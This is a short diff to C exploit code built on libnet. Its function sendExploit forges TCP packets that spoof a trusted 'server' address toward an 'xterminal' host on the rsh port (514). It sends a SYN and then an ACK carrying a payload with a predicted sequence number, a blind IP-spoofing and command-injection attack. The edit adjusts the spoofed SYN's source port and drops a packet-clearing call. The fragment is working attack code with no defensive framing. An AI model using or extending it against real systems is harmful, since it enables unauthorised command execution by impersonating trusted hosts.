@@ -115,11 +115,10 @@ void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_lon
 {
 
 //SYN
-        tcpTagCreate(l,(u_int32_t)513, (u_int32_t)514,(u_int32_t)1234,(u_int32_t)1,NULL,0,TH_SYN);
+        tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1234,(u_int32_t)1,NULL,0,TH_SYN);
         ipTagCreate(l,(u_int32_t)server,(u_int32_t)xterminal,NULL,(u_int32_t)0);
         sendPacket(l);
         sleep(1);
-        libnet_clear_packet(l);
 
 //ACK
         tcpTagCreate(l,(u_int32_t)514, (u_int32_t)514,(u_int32_t)1235,next+1,(char*)payload,plen, (u_int8_t)TH_ACK | TH_PUSH);
